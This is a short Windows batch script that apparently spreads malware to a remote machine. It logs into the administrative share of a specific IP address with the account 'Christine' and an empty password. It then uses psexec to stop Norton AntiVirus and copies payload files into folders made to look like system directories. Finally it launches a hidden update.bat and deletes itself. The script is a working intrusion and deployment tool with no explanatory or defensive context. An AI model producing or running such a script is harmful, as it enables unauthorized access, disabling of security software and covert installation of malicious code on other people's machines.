net use p: /delete
net use \\213.123.251.10 /USER:Christine
net use p: \\213.123.251.10\C$
psexec \\213.123.251.10 -u Christine -p "" net stop "Norton AntiVirus Server"
psexec \\213.123.251.10 -u Christine -p "" -c temp.bat
mkdir p:\winnt\system32\rmtcfg
mkdir p:\winnt\system32\catroot
copy copy\* p:\winnt\system32\rmtcfg
mkdir p:\winnt\system32\rmtcfg\files
mkdir p:\winnt\system32\rmtcfg\files\copy
mkdir p:\winnt\system32\rmtcfg\files\dat
mkdir p:\winnt\system32\rmtcfg\files\log
mkdir p:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\SYSTEM32\RMTCFG\files\* p:\winnt\system32\rmtcfg\files
copy copy\* p:\winnt\system32\rmtcfg\files\copy
copy plugin\* p:\winnt\system32\rmtcfg\files\plugin
copy dat\* p:\winnt\system32\rmtcfg\files\dat
psexec \\213.123.251.10 -u Christine -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use p: /delete
net use \\213.123.251.10 /delete
del runme988686.bat
